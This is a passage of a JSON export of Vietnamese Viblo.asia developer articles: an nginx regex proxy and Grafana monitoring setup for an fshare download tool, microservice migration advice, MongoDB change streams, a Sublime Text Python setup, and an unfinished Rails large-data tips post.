cấp, không chỉ có `download022.fshare.vn`, mà nó loadbalancer qua nhiều endpoint khác nữa. Ví dụ 023, 024, 011...\nMình không thể config 1 cách bị động cho từng endpoint như vậy được.    \n=> Config với `regex` để dynamic việc route proxy. \nViệc này khiến mình mất khá nhiều thời gian, vì mình không quá thành thục về việc này. Nó làm mình mất 3-4 tiếng để thử nghiệm regex, và google debug.      \nCuối cùng format hoạt động tốt:\n```bash\nserver {\n  listen 80;\n  server_name   ~^(www\\.)?[^.]+.tungexplorer.me$;\n  access_log off;\n  if ($host ~* ^(www\\.)?([^.]+).tungexplorer.me$) {\n    set $subdomain $2;\n  }\n  resolver 8.8.8.8 valid=10s;\n  location / {\n    proxy_pass http://$subdomain.fshare.vn;\n    proxy_read_timeout 300;\n    proxy_connect_timeout 300;\n    proxy_redirect     off;\n\n    proxy_set_header   X-Forwarded-Proto $scheme;\n    proxy_set_header   Host              $http_host;\n    proxy_set_header   X-Real-IP         $remote_addr;\n  }\n}\n```\n\n## 7. Lựa chọn tech stack vòng 3\nVề cơ bản hệ thống đã hoạt động gần như ý mình muốn. Tuy nhiên mình muốn làm 2 việc nữa:\n1. Control limit bandwith cho mỗi lượt download. Tuy server mình có đường truyền tới 10Gbps, tuy nhiên mình muốn mỗi lượt download, chỉ có tốc độ giới hạn là XXX `Mbps`. => NGINX Plus cung cấp tính năng này, tuy nhiên giá Nginx Plus khá đắt. $25000 / năm. => tới thời điểm hiện tại mình vẫn bỏ ngỏ bài toán này.\n2. Mình cần 1 hệ thống monitor webserver của mình, mình muốn theo dõi là hiện tại đang có bao nhiêu lượt download, tổng traffic trên các cổng mạng đang là bao nhiêu, tài nguyên cpu, ram có đang full load không. Sau khi cân nhắc mình quyết định sử dụng combo: `Prometheus + Grafana + Prometheus Exporter`\n    - Prometheus server: lấy metric từ các `client/ device` về để theo dõi.\n    - Prometheus Exporter : client của prometheus, thu thập metric trên \"client\" đang chạy, để gửi về cho `prometheus server`\n    - Grafana: kết nối với prometheus, sau đó đồ thị hóa việc show metric cho admin, thông qua webUI. \n\nHình ảnh chụp `1 Dashboard monitor traffic của Grafana`\n![Grafana](https://tungexplorer.s3.ap-southeast-1.amazonaws.com/grafana/snmp_garafana.png)\n\nNote: việc sử dụng combo `Prometheus + Grafana + Prometheus Exporter` mới đầu mình đánh giá có vẻ khá thừa thãi, thấy khá \"phức tạp hóa\" vấn đề. Tuy nhiên, hệ thống này mình sẽ còn phát triển thêm nữa. Nên mình vẫn quyết định lựa chọn dùng chúng.\n\n## 8. Full SourceCode\n- Mình public source application tại đây: https://github.com/tungtv202/getlink_fshare",
        "published_at": "2020-02-11 22:43:11",
        "is_published": true,
        "updated_at": "2020-02-12 21:51:01",
        "translation_source": null,
        "trend_at": "2020-02-12 17:02:20",
        "promoted_at": null,
        "reading_time": 11,
        "points": 20,
        "views_count": 828,
        "clips_count": 12,
        "comments_count": 4,
        "rated_value": null,
        "promoted": true,
        "trending": true,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://tungexplorer.s3.ap-southeast-1.amazonaws.com/grafana/snmp_garafana.png",
        "user": {
            "data": {
                "id": 14798,
                "url": "https://viblo.asia/u/tungtv",
                "avatar": "c75c5b15-b33b-4822-9bca-38a08e13f766.jpg",
                "name": "Tran Van Tung",
                "username": "tungtv",
                "followers_count": 52,
                "reputation": 992,
                "posts_count": 8,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "prometheus",
                    "name": "Prometheus",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Prometheus&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "fshare",
                    "name": "fshare",
                    "primary": false,
                    "image": "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=fshare&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "spring",
                    "name": "Spring",
                    "primary": false,
                    "image": "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Spring&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "nginx",
                    "name": "nginx",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=nginx&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "java",
                    "name": "Java",
                    "primary": false,
                    "image": "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Java&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": [
                {
                    "id": 18587,
                    "url": "https://viblo.asia/u/chomchomcapital",
                    "avatar": null,
                    "name": "Phạm Hồng Quân",
                    "username": "chomchomcapital",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 27731,
                    "url": "https://viblo.asia/u/tranxuanthang",
                    "avatar": "ea519b61-3fd3-43ea-87d7-32b481979769.jpg",
                    "name": "Trần Xuân Thắng",
                    "username": "tranxuanthang",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 39674,
                    "url": "https://viblo.asia/u/tqttrieu",
                    "avatar": "26fdadaa-58ed-4dca-a20d-f9e63f180229.png",
                    "name": "Triều Trần",
                    "username": "tqttrieu",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                }
            ]
        }
    },
    {
        "id": 38412,
        "title": "Triển khai Microservice như thế nào để tăng độ hiệu quả?",
        "slug": "4dbZN1AmKYM",
        "url": "https://viblo.asia/p/trien-khai-microservice-nhu-the-nao-de-tang-do-hieu-qua-4dbZN1AmKYM",
        "user_id": 40256,
        "moderation": null,
        "transliterated": "trien-khai-microservice-nhu-the-nao-de-tang-do-hieu-qua",
        "contents_short": "Có rất nhiều câu hỏi inbox mình về cách triển khai microservice sau khi mình share slide, do slide này mình làm để thuyết trình là chính nên đúng là hơi khó hiểu.\nMình trả lời không xuể nhưng chung...",
        "contents": "Có rất nhiều câu hỏi inbox mình về cách triển khai microservice sau khi mình share slide, do slide này mình làm để thuyết trình là chính nên đúng là hơi khó hiểu.\nMình trả lời không xuể nhưng chung quy đây là cách mình hay tư vấn (cho các đơn vị đang có hệ thống monolithic lớn):\n\n**1. Tách services**: Tách tầng application code thành các module/service ko phụ thuộc nhau, muốn lấy gì thì phải thông qua interface (có thể là http request, streaming, socket, rpc,… thường là RPC). Done bước 1 thì các service độc lập và vẫn xài DB chung.\n\n**2. Xử lý tầng DB cơ bản**: Remove dần các store procedure và các lệnh join nếu có, chỉ giữ lại những cái cùng domain (vd như join từ order qua user là loại bỏ). Remove cái nào thì application code gánh lại phần logic đó. Để an toàn thì có thể làm phía application code trước, thấy ổn rồi chuyển qua, thấy sai thì sửa hoặc rollback version làm lại. Vì giao tiếp qua interface nên miễn là return đúng và đủ là được.\n\n**3. Tách DB lớn:** DB lớn sử dụng trước đó thành từng cụm theo domain. Có thể dùng cách tạo các user db với các quyền hạn chế theo domain để thử nghiệm trước khi tách hẳn. Done bước này các service chính thức độc lập với nhau.\n\n**4. Microservice (chia nhỏ nữa hay ko???):** là do lựa chọn của team và thực trạng hệ thống. Và cách làm là đúng như bước 1–3\n\n**— — — — — — — — — — Các câu hỏi thường gặp — — — — — —— — — — — —**\n\n**1. Chỉ tách service nhưng ko tách db thì sao?**\n- Không sao nhưng hiệu quả ko đáng kể, trước mắt chỉ lợi được deployment và giảm thiểu sự phụ thuộc lẫn nhau ở tầng code.\n\n**2. Tách DB xong hết rồi nhưng hệ thống vẫn chậm?**\n- Microservice bản chất ko giúp hệ thống nhanh hơn, mà giúp hệ thống được chia nhỏ thành nhiều phần để dễ trị. VD như 1 table quá to làm cho service chậm là một vấn đề khác: scaling/sharding db.\n\n**3. Hồi xưa 1 cục chạy nhanh bây giờ tách ra thấy chậm hẳn ta!!**\n- Đúng là vậy, lúc này xuất hiện response time giữa các service mà hồi xưa ko có. Giải pháp là: giảm thời gian encode/decode và mở đóng connection giữa các service (dùng gRPC).\n\n**4. Service A call service B thì phải biết IP của B, rồi lỡ scale B lên nhiều nodes thì sao?**\n- Vì thế mà mới có khái niệm service proxy và service mesh hay service discovery. Nó giúp điều phối requests vào các node cũng như phân giải IP như DNS. Từ đó A ko call B mà call qua 1 discovery/master node có thông tin của B.\n\n**5. Việc logging, monitoring, tracing hồi xưa làm 1 cục chung h riêng phải làm từng service hả?**\n- YES. Vì thế mà logging, monitoring, tracing trong microservices được nâng lên 1 level mới, với nhiều khái niệm chung: agent, collector, pipeline, streaming, master dashboard,…\n“Microservice loại bỏ sự phụ thuộc, nhưng thêm vào rất nhiều thứ phức tạp”\nBây giờ thì mọi người hiểu tại sao lại có vị trí devops rồi đó. Deploy đúng và đảm bảo hệ thống chạy ổn định, tìm ra nguyên nhân sự cố là trong những main skill của bạn này.\n\n\nTác giả: **Việt Trần** — **Founder 200lab**\n\nDưới đây là slide chia sẻ từ tác giả.\n\n\n[http://bit.ly/2UrGQXL](http://bit.ly/2UrGQXL)\n\n[http://bit.ly/2v8iisg](http://bit.ly/2v8iisg)",
        "published_at": "2020-02-11 19:49:45",
        "is_published": true,
        "updated_at": "2020-02-12 21:51:01",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 4,
        "points": 2,
        "views_count": 268,
        "clips_count": 2,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": null,
        "user": {
            "data": {
                "id": 40256,
                "url": "https://viblo.asia/u/core200lab",
                "avatar": "6e49b922-c150-443f-b549-ae4bc34ff1f4.jpg",
                "name": "Technology solution for startup",
                "username": "core200lab",
                "followers_count": 5,
                "reputation": 57,
                "posts_count": 3,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "200lab",
                    "name": "200lab",
                    "primary": false,
                    "image": "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=200lab&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "microservice",
                    "name": "microservice",
                    "primary": false,
                    "image": "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=microservice&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "solution-architecture",
                    "name": "solution architecture",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=solution+architecture&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 37782,
        "title": "Change streams trong MongoDB",
        "slug": "Ljy5V7y3Kra",
        "url": "https://viblo.asia/p/change-streams-trong-mongodb-Ljy5V7y3Kra",
        "user_id": 26904,
        "moderation": null,
        "transliterated": "change-streams-trong-mongodb",
        "contents_short": "1. Change Streams là gì?\n\nKhi bạn làm việc với những RDBMS như MySQL hay SQL Server chắc hẳn bạn đã nghe đến Trigger. Và khi bạn lần mò MongoDB, liệu đã bao giờ bạn tự hỏi, Trigger trong MongoDB nh...",
        "contents": "## 1. Change Streams là gì?\n\nKhi bạn làm việc với những RDBMS như MySQL hay SQL Server chắc hẳn bạn đã nghe đến [Trigger](https://dev.mysql.com/doc/refman/8.0/en/trigger-syntax.html). Và khi bạn lần mò MongoDB, liệu đã bao giờ bạn tự hỏi, Trigger trong MongoDB như thế nào?\n\nMongoDB không có cơ chế để bạn cài đặt sẵn Trigger lên DB như MySQL. Tuy nhiên, nếu chúng ta có thể stream được các thay đổi trong Database thì chúng ta hoàn toàn có thể làm những tính năng tương tự như Trigger từ phía app-server và thậm chí là nhiều hơn thế!\n\nTrong MongoDB, bắt đầu từ version 3.6, có một tính năng để bạn có thể thực hiện điều đó gọi là **Change Streams**.  Change streams hoạt động dựa trên việc lắng nghe [**oplog**](https://docs.mongodb.com/manual/core/replica-set-oplog/) - thứ mà bạn có thể hiểu đơn giản là log của MongoDB phục vụ cho tính năng [replication](https://docs.mongodb.com/manual/replication/). Chúng ghi lại tất cả các sửa đổi dữ liệu trong Database của bạn. \n\nChính vì thế, bạn có thể sử dụng change streams để subscribe các thay đổi trên một collection, hoặc database và thậm chí là deployment.\n\n## 2. Stream A Collection/Database/Deployment\n\nĐể thực hiện change streams, database của bạn phải thực hiện cung cấp `changeStream` và `find` actions, cụ thể như sau:\n\n```\n{ resource: { db: <dbname>, collection: <collection> }, actions: [ \"find\", \"changeStream\" ] }\n```\n\n#### a. Tạo con trỏ cho stream Collection/Database/Deployment\n\n- Bạn có thể thực hiện cho một collection bất kỳ (trừ các **system** collections, hoặc các collections nằm trong **admin**, **local** và **config** databases). Thực hiện câu lệnh [`db.collection.watch()`](https://docs.mongodb.com/manual/reference/method/db.collection.watch/#db.collection.watch) để bắt đầu.\n- Đối với Database, bạn có thể thực hiện với database bất kỳ ngoại trừ **admin**, **local** và **config** databases. Câu lệnh: [`db.watch()`](https://docs.mongodb.com/manual/reference/method/db.watch/#db.watch)\n- Đối với Deployment, bạn có thể theo dõi sự thay đổi liên quan đến deployment đối với tất cả các databases, collections ngoại trừ **admin**, **local** và **config** databases. Câu lệnh: [`Mongo.watch()`](https://docs.mongodb.com/manual/reference/method/Mongo.watch/#Mongo.watch)\n\n#### b. Tạo change stream\n\nSau khi tạo con trỏ cho stream, bạn có thể mở một change stream để stream data trong mongoDB:\n```\nconst collection = db.collection('test');\nconst changeStream = collection.watch(); // có thể là Mongo.watch() hoặc db.watch()\nchangeStream.on('change', changeEvent => {\n  // process next document\n});\n```\n\nBạn cũng có thể viết iterator như sau:\n```\nconst collection = db.collection('test');\nconst changeStreamIterator = collection.watch();\nconst next = await changeStreamIterator.next();\n```\n\n#### c. changeEvent object\n\nNhìn đoạn code bên trên chắc hẳn bạn sẽ tò mò cái object `changeEvent` bên trên là gì đúng không?\nNó là một object có dạng:\n```\n{\n   _id : { <BSON Object> },\n   \"operationType\" : \"<operation>\",\n   \"fullDocument\" : { <document> },\n   \"ns\" : {\n      \"db\" : \"<database>\",\n      \"coll\" : \"<collection\"\n   },\n   \"to\" : {\n      \"db\" : \"<database>\",\n      \"coll\" : \"<collection\"\n   },\n   \"documentKey\" : { \"_id\" : <value> },\n   \"updateDescription\" : {\n      \"updatedFields\" : { <document> },\n      \"removedFields\" : [ \"<field>\", ... ]\n   }\n   \"clusterTime\" : <Timestamp>,\n   \"txnNumber\" : <NumberLong>,\n   \"lsid\" : {\n      \"id\" : <UUID>,\n      \"uid\" : <BinData>\n   }\n}\n```\nTrong đó:\n- `operationType` là type của event vừa xảy ra gồm: **`insert`**, **`update`**, **`replace`**, **`delete`**, **`drop`** ,**`rename`**, **`dropDatabase`**, **`invalidate`**.\n- `fullDocument` là thông tin của `document` vừa được thực hiện CRUD (`insert`, `update`, `replace`, `delete`), đối với `delete` field này được bỏ qua vì document không còn tồn tại. Đối với `update`, field này tồn tại nếu bạn set `fullDocument: 'updateLookup'` cho stream:\n```\nconst changeStreamIterator = collection.watch({ fullDocument: 'updateLookup' });\n```\n-  `ns`: database và collection name bị ảnh hưởng bởi event.\n-  `to`: khi bạn thực hiện đổi tên `database`, `collection` thì nó hiển thị tên mới của `ns`.\n-  `documentKey`: chứa `_id` của `document` được thực hiện thay đổi.\n- `updateDescription`: chứa thông tin các `fields` được cập nhật hoặc xoá bởi hoạt động `update`.\n- `clusterTime`: thời gian thực hiện event ở trên `oplog`.\n\n\nBạn có thể tham khảo chi tiết hơn về nó [ở đây](https://docs.mongodb.com/manual/reference/change-events/#change-stream-output) nhé :laughing:\n\n## 3. Resume a Change Stream\n\nVí dụ có hàng loạt change streams liên tiếp xảy ra, vì một lý do nào đó, bạn dừng lại ở một change stream, giả sử connect đến database server bị die, hoặc bạn cần disconnect với database server -> bạn không thể handle được events xảy ra ngay sau đó.\n\nMongoDB có một cơ chế để bạn có thể giải quyết vấn đề này, bằng cách bạn lưu trữ lại `token` của một `change stream` và sau đó bạn có thể `resume` lại việc lắng nghe các event bắt đầu từ `change stream` đó.\n\n```\nconst collection = db.collection('test');\nconst changeStream = collection.watch();\n\nlet newChangeStream;\nchangeStream.once('change', next => {\n  const resumeToken = changeStream.resumeToken;\n  changeStream.close();\n\n  newChangeStream = collection.watch({ resumeAfter: resumeToken });\n  newChangeStream.on('change', changeEvent => {\n    // process next document\n  });\n});\n```\nNhư bạn thấy, chúng ta close `change stream` ngay sau khi lấy ra `resumeToken` và bạn có thể tiếp tục lại từ `change stream` này với option: `{ resumeAfter: resumeToken }`\n\nLưu ý:\n- resumeAfter có nghĩa là tiếp tục stream từ `resumeToken` nên nếu stream đó là một [`invalidate`](https://docs.mongodb.com/manual/reference/change-events/#change-event-invalidate) event thì nó sẽ close change streams.\n- Từ phiên bản `4.2` bạn có thể sử dụng `startAfter` thay thế cho `resumeAfter`, nó sẽ tạo ra một streams mới từ sau `resumeToken` chứ không phải tiếp tục streams cũ. Nên nó sẽ không bị close nếu đó là  [`invalidate`](https://docs.mongodb.com/manual/reference/change-events/#change-event-invalidate) event.\n\n\n## 4. Kết luận\n\nChange streams là một tính năng khá hữu ích và không khó để handle. Chúng ta có thể dùng nó để lắng nghe các events ở database một cách realtime. Hi vọng bài viết sẽ giúp ích cho các bạn khi làm việc với MongoDB. :wink:",
        "published_at": "2020-02-11 17:12:50",
        "is_published": true,
        "updated_at": "2020-02-12 21:01:02",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 5,
        "points": 2,
        "views_count": 30,
        "clips_count": 1,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": null,
        "user": {
            "data": {
                "id": 26904,
                "url": "https://viblo.asia/u/kaitou229",
                "avatar": "3bdc6e65-c7d4-4b8d-9809-5ec40be1d7fb.jpg",
                "name": "Lao Văn Tuấn",
                "username": "kaitou229",
                "followers_count": 11,
                "reputation": 317,
                "posts_count": 11,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "mongodb",
                    "name": "MongoDB",
                    "primary": false,
                    "image": "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=MongoDB&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "nosql",
                    "name": "NoSQL",
                    "primary": false,
                    "image": "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=NoSQL&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38333,
        "title": "Chạy ứng dụng Hello World với Sublime",
        "slug": "07LKXm34ZV4",
        "url": "https://viblo.asia/p/chay-ung-dung-hello-world-voi-sublime-07LKXm34ZV4",
        "user_id": 35429,
        "moderation": null,
        "transliterated": "chay-ung-dung-hello-world-voi-sublime",
        "contents_short": "Đầu tiên bạn phải cài đặt Python và Sublime Text tại đường dẫn sau:\n\nHướng dẫn cài đặt Python trên hệ điều hành Windows MacOS và Linux\n\nVới phiên bản mới nhất của Python và Sublime Text đã được cài...",
        "contents": "Đầu tiên bạn phải cài đặt Python và Sublime Text tại đường dẫn sau:\n\n[Hướng dẫn cài đặt Python trên hệ điều hành Windows MacOS và Linux](https://viblo.asia/s/huong-dan-cai-dat-python-tren-he-dieu-hanh-windows-macos-linux-2020-b85og8R452G)\n\nVới phiên bản mới nhất của Python và Sublime Text đã được cài đặt, bạn gần như đã sẵn sàng để chạy chương trình Python đầu tiên được viết bằng trình soạn thảo văn bản.\n\nNhưng trước khi làm điều đó, bạn cần chắc rằng Sublime Text đã được cài đặt đúng phiên bản Python trên hệ thống của bạn.  Sau đó bạn viết chương trình Hello World! và chạy nó.\n\n### Cấu hình Sublime Text để sử dụng đúng phiên bản Python\n\nNếu lệnh `python` trên hệ thống của bạn chạy Python 3, bạn sẽ không cần cấu hình bất cứ thứ gì và có thể bỏ qua phần này.\n\nNếu hệ thống của bạn sử dụng lệnh `python3`, bạn sẽ cần cấu hình Sublime Text để sử dụng đúng phiên bản của Python.\n\nMở ứng dụng Sublime Text. **Chọn Tool** -> **Build System** -> **New Build System**, để mở 1 file cấu hình mới cho bạn. Xoá những gì bạn nhìn thấy, và nhập như sau:\n\n```\n{\n\t\"cmd\": [\"/Library/Frameworks/Python.framework/Versions/3.8/bin/python3\", \"-u\", \"$file\"],\n}\n```\n\nĐoạn code này cho phép Sublime Text sử dụng `python3` khi chạy chương trình Python. Lưu file với tên Python3.sublime-build trong thư mục mặc định khi Sublime Text chọn file Save.\n\n### Chạy file helloworld.py\n\nTrước khi bạn viết chương trình đầu tiên, tạo một thư mục tên là `python_work` ở một nơi nào đó trên hệ thống của bạn. Khi đặt tên file, tốt nhất là sử dụng chữ thường và dấu gạch dưới, bởi vì đây là qui ước về cách đặt tên của Python. Tuân theo chuẩn này thì các Python coder khác sẽ dễ hiểu code của bạn hơn.\n\nMở Sublime Text, chọn Open, sau đó chọn đường dẫn tới thư mục bạn vừa tạo `python_work`\n\n![Open Menu](https://images.viblo.asia/18d7069c-de73-4cc3-8ded-e7c0c691d1cc.png)\n\nTạo một file tên là `hello_world.py` trong thư mục `python_work`\n\n![New file](https://images.viblo.asia/e9d37ea8-076d-461e-a63b-d4c5a93d78e1.png)\n\nPhần đuôi file `.py` thông báo với Sublime Text rằng code được viết bằng Python, để giúp Sublime Text biết cách xử lý và `highlight syntax`\n\nSau khi bạn tạo file xong, nhập đoạn code sau:\n\n```\nprint(\"Hello Python world!\")\n```\n \n Nếu lệnh `python` hoạt động trên hệ thống của bạn. Bạn có thể chạy chương trình bằng cách chọn **Tools -> Build** trên menu hoặc bấm tổ hợp phím **CTRL-B**.\n \n Nếu bạn cấu hình Sublime Text như phần trước: chọn **Tool -> Build System** và sau đó chọn **Python3**. Kể từ bây giờ bạn có thể chạy chương trình bằng cách chọn **Tools -> Build** trên menu hoặc bấm tổ hợp phím **CTRL-B**.\n \n Màn hình terminal sẽ xuất ra tại phần dưới cửa sổ Sublime Text như sau:\n \n ![Hello output](https://images.viblo.asia/46c0dc68-5567-4acb-8bad-1453d8e55608.png)\n\n### Tổng kết\nBạn đã cấu hình xong Python3 cho Sublime Text 3.\n\nNếu có vấn đề khi cài đặt, bạn hãy comment bên dưới, mình sẽ hỗ trợ trong thời gian sớm nhất!\n\nCảm ơn các bạn đã quan tâm bài viết này.\n\n### Tham khảo\nPYTHON CRASH COURSE - A Hands On Project Based Introduction To Programming (Eric Matthes).",
        "published_at": "2020-02-11 15:30:05",
        "is_published": true,
        "updated_at": "2020-02-12 21:05:01",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 3,
        "points": 0,
        "views_count": 35,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/18d7069c-de73-4cc3-8ded-e7c0c691d1cc.png",
        "user": {
            "data": {
                "id": 35429,
                "url": "https://viblo.asia/u/vuuvinhphuc",
                "avatar": null,
                "name": "Phuc Vuu",
                "username": "vuuvinhphuc",
                "followers_count": 5,
                "reputation": 203,
                "posts_count": 13,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "hello-world-python",
                    "name": "Hello World Python",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Hello+World+Python&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "sublime-text-python",
                    "name": "Sublime Text Python",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Sublime+Text+Python&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "cai-dat-python",
                    "name": "cài đặt python",
                    "primary": false,
                    "image": "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=cài+đặt+python&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38380,
        "title": "Lưu ý khi xử lý lượng dữ liệu lớn trong rails",
        "slug": "naQZRDmA5vx",
        "url": "https://viblo.asia/p/luu-y-khi-xu-ly-luong-du-lieu-lon-trong-rails-naQZRDmA5vx",
        "user_id": 35803,
        "moderation": null,
        "transliterated": "luu-y-khi-xu-ly-luong-du-lieu-lon-trong-rails",
        "contents_short": "Rails là một framework tuyệt vời, nó đã giúp cho các các cá nhân và các doanh nghiệp xây dựng được những sản phẩm của họ trong một khoảng thời gian rất ngắn. Rails được dùng làm backend cho nhiều d...",
        "contents": "Rails là một framework tuyệt vời, nó đã giúp cho các các cá nhân và các doanh nghiệp xây dựng được những sản phẩm của họ trong một khoảng thời gian rất ngắn. Rails được dùng làm backend cho nhiều dự án web hoặc làm server API cho các app di động  của các startup. Bản thân mình cũng thích cú pháp và tốc độ dev dự án bá đạo của rails.\n\n![](https://images.viblo.asia/638d4380-c04e-4db4-b31b-b55e7b37cc0c.png)\n\n\nTuy nhiên, một câu hỏi được đặt ra là, tốc độ xử lý của Rails khi phải đương đầu với một lượng dữ liệu lớn sẽ như thế nào? Chắc hẳn bạn đã đọc câu truyện \"How We Went from 30 Servers to 2: Go\", nếu chưa thì hãy đọc thử ở [đây](https://blog.iron.io/how-we-went-from-30-servers-to-2-go/). Đại khái câu truyện là một công ty xây dựng một hệ thống backend bằng Rails để chạy các sản phẩm mà họ làm cho các khách hàng và dùng 30 server để duy trì nó. Khi số lượng khách hàng tăng, lượng dữ liệu trở nên quá tải đối với hệ thống và công ty này buộc phải chuyển từ Rails sang Go, và kết quả là họ thành công, nhưng đặc biệt là họ chỉ cần dùng có 2 server để duy trì hệ thống thôi. \n\nLiệu rằng Rails có bị nghẽn cổ chai khi chúng ta cố gắng xử lý một lượng dữ liệu khổng lồ hay không ? Có lẽ không, nếu như chúng ta sử dụng các mẹo sau.\n\n## 1. Đừng dùng ActiveRecord nếu có thể\n\nActiveRecord làm cho mọi thứ trở nên rất dễ dàng, nhưng nó không được tạo ra dành cho dữ liệu thô. Khi bạn muốn dùng một loạt các tiến trình đơn giản vào hàng triệu bản ghi, bạn nên dùng lệnh SQL thuần thì hơn. Nếu bạn cảm thấy bạn cần một công cụ ORM để giúp bạn có thể dễ làm việc hơn, hãy thử SEQUEL.\n\n## 2. Dùng update_all để cập nhật tất cả bản ghi\n\nDưới đây là một lỗi cơ bản thường thấy ở những người muốn lặp lại toàn bộ bảng và cập nhật từng phần tử một:\n\n```ruby\n  User.where(city: “Houston”).each do |user|\n    user.note = “Houstonian”\n    user.save\n  end\n```\nĐoạn code khá dễ hiểu nhưng lại có nhược điểm chí mạng. Nếu có 100000 user có trường city là \"Houston\" thì đoạn code sẽ chạy tầm 24 tiếng. Lâu phết nhỉ? Có một giải pháp nhanh gọn và hiệu quả hơn nhiều:\n\n```ruby\n  User.update_all({note: “Houstonian”}, {city: “Houston”})\n```\nVà đoạn code này chạy chỉ trong vòng 30 giây với cùng một lượng dữ liệu với đoạn ở trên.\n\n## 3. Chỉ lấy dữ liệu ở những cột cần thiết\n\nĐoạn code `User.where(city: “Houston”)` sẽ lấy tất cả thông tin từ các user trong database. Nếu bạn không cần dùng những thông tin phụ như tuổi tác, giới tính, tính trạng hôn nhân,... thì bạn không nên lấy tất cả đống thông tin đó ngay từ đầu làm gì cả. Hãy dùng `select_column` khi bạn muốn lấy dữ liệu của vài cột:\n```ruby\n  User.select(“city”, “state”).where(age: 29)\n```\n\n## 4. Thay thế lệnh Model.all.each với find_in_batches\n\nVới những hệ thống nhỏ thì thay đổi như thế này không quan trọng cho lắm. Nhưng với hệ thống có 100000 bản ghi thì lệnh trên có thể dễ dàng chiếm từ 5 GB bộ nhớ trở lên. Server sẽ dễ dàng bị sập. Vì vậy, mình cho rằng nên dùng `find_in_batches` để giải quyết vấn đề này:\n```ruby\n  User.find_in_batches(conditions: ‘grade = 2', batch_size: 500) do |students|\n    students.each do |student|\n      student.find_or_create_by_class_name(‘PE’)\n    end\n  end\n```\n\n## 5. Đừng dùng transaction quá nhiều\n```ruby\n  (0.2ms) BEGIN\n  (0.4ms) COMMIT\n```\n\n![](https://images.viblo.asia/8cab1532-a24e-48c5-891c-1d5c802b877e.png)\n\nTransaction được chạy mỗi khi object được lưu. Nó sẽ chạy hàng triệu lần trong suốt quá trình chạy hệ thống. Kể cả chúng ta có dùng find_in_batches, cách duy nhất để hạn chế transaction một cách hiệu quả là nhóm các tiến trình lại. Đoạn code ở phần 4 vẫn có thể được tối ưu như sau:\n\n```ruby\n  User.find_in_batches(conditions: ‘grade = 2', batch_size: 500) do |students|\n    User.transaction do\n      students.each do |student|\n        student.find_or_create_by_class_name(‘PE’)\n      end\n    end\n  end\n```\n\nBằng cách này, thay vì phải `commit` từng bản ghi một, bây giờ chỉ cần `commit` sau mỗi 500 bản ghi thôi, hiệu quả hơn nhiểu.\n\n## 6. Đừng quên đánh index\n\nLuôn luôn đánh index những cột hoặc nhóm cột quan trọng mà bạn hay truy vấn nhất. Bằng không, lệnh của bạn sẽ mất cả đời để chạy đấy.\n\n## 7. Destroy chiếm rất nhiều tài nguyên\n\n`Destroy` trong ActiveRecord là một tiến trình rất nặng. Hãy đảm bảo bạn biết bạn đang làm gì. Một điều mà bạn phải biết đó là: mặc dù `destroy` và `delete` đều xóa các bản ghi, `destroy` sẽ chạy tất cả các hàm callback, điều này rất tốn thời gian. Tương tự với `destroy_all` và `delete_all`. Vì thế, nếu bạn chỉ muốn xóa các bản ghi mà không động chạm vào bất kì thứ gì khác, bạn nên chỉ dùng `delete_all`. \nTrong trường hợp khác là nếu bạn 